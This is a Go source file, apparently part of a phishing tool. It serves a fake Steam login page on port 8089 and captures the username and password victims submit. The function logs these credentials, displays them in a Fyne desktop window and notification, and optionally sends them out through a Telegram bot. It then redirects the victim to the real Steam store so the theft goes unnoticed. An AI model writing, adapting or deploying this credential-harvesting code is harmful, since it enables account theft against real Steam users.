package main

import (
	"fmt"
	"log"
	"net/http"

	"fyne.io/fyne"
	"fyne.io/fyne/dialog"
	"fyne.io/fyne/widget"
	"github.com/raifpy/Go/errHandler"
)

func serveSteamLogin(win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
	serveFunc := func(response http.ResponseWriter, req *http.Request) {
		log.Println("Requests -> ", req.Form.Encode())
		//query := req.URL.Query()
		//if key, ok := query["nick"]; ok {
		if !errHandler.HandlerBool(req.ParseForm()) {
			login := req.FormValue("username")
			pass := req.FormValue("password")

			if login != "" || pass != "" {
				log.Printf("Login = %s  Passw = %s", login, pass)
				*textStream += "\nlogin = " + login + "\nPass = " + pass + "\n"
				if useTelegramBot {
					tg.send("Login = " + login + "\nPass = " + pass)
				}
				textGrid.SetText(*textStream)
				notiApp.SendNotification(fyne.NewNotification("New Form", login+" : "+pass))
				http.Redirect(response, req, "https://store.steampowered.com", 301)
				return
			}
			*textStream += "New Requests\n"
			if useTelegramBot {
				tg.send("New Request on steam")
			}
			textGrid.SetText(*textStream)
		} else {
			log.Println("Error to req.ParseFrom")
		}

		fmt.Fprintln(response, steamLogin)
		return
	}
	http.HandleFunc("/", serveFunc)
	err := http.ListenAndServe(":8089", nil)
	dialog.ShowError(err, win)
}
